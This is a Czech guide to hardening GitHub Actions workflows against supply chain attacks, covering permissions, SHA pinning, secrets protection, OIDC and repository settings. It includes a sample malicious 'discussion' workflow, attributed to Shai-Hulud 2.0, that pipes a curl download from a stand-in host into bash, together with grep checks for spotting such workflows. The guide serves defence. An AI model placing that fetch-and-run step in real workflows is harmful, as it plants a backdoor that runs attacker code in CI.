---
title: Zpevnění GitHub Actions
description: Zabezpečte vaše GitHub Actions workflows proti supply chain útokům
sidebar:
  order: 3
lastUpdated: 2025-12-05
---

# Zpevnění GitHub Actions

> Chraňte vaše workflows před zneužitím supply chain útoky

## ⚠️ Vektor Útoku Shai-Hulud 2.0

Malware vytváří backdoor workflow soubor:

```yaml
# .github/workflows/discussion.yaml - ŠKODLIVÝ!
name: Discussion
on:
  discussion:
    types: [created]
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - run: curl -sSL https://malicious-url | bash
```

## Detekce

```bash
# Zkontrolujte podezřelé workflow soubory
find .github/workflows -name "*.yaml" -o -name "*.yml" | \
  xargs grep -l "discussion:" 2>/dev/null

# Zkontrolujte curl/wget ve workflows
grep -r "curl\|wget" .github/workflows/
```

## Kontrolní Seznam Zpevnění

### 1. Oprávnění Workflow

```yaml
# ✅ Omezit výchozí oprávnění
permissions: read-all

jobs:
  build:
    permissions:
      contents: read
      # Přidejte pouze co je potřeba
```

### 2. Připnutí Actions na SHA

```yaml
# ✅ Dobře: Plné SHA
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

# ❌ Špatně: Tag může být přesunut
- uses: actions/checkout@v4
```

### 3. Omezení Secrets

```yaml
# ✅ Použít ochranu prostředí
jobs:
  deploy:
    environment: production  # Vyžaduje schválení
    steps:
      - run: deploy
        env:
          TOKEN: ${{ secrets.PROD_TOKEN }}
```

### 4. Zakázat Fork PRs

```yaml
# Spouštět pouze na důvěryhodných větvích
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
    # Nespouštět na forks
    types: [opened, synchronize]
```

### 5. Použít OIDC Místo Secrets

```yaml
# ✅ OIDC pro cloud providery
permissions:
  id-token: write
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789:role/GitHubActions
      aws-region: us-east-1
```

## Nastavení Repozitáře

1. **Settings → Actions → General**
   - Fork pull request workflows: Vyžadovat schválení
   - Workflow permissions: Číst obsah repozitáře

2. **Settings → Branches → Protection rules**
   - Vyžadovat status checks
   - Vyžadovat review před merge

3. **Settings → Secrets and variables**
   - Použít environment secrets
   - Nastavit secret scanning alerty
